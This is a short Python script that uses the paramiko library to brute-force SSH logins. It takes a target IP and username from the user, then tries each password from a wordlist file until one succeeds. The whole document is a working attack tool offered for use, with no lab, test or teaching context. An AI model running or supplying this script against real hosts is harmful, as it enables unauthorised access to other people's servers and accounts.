import paramiko

def ssh_brute_force(target_ip, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    with open(password_list, 'r') as file:
        for password in file.readlines():
            password = password.strip()
            try:
                ssh.connect(target_ip, port=22, username=username, password=password)
                print(f"Success! Password found: {password}")
                return
            except paramiko.AuthenticationException:
                print(f"Failed attempt with: {password}")
    print("Password not found in the list.")

if __name__ == "__main__":
    target_ip = input("Enter target IP: ")
    username = input("Enter SSH username: ")
    password_list = "passwords.txt"
    ssh_brute_force(target_ip, username, password_list)
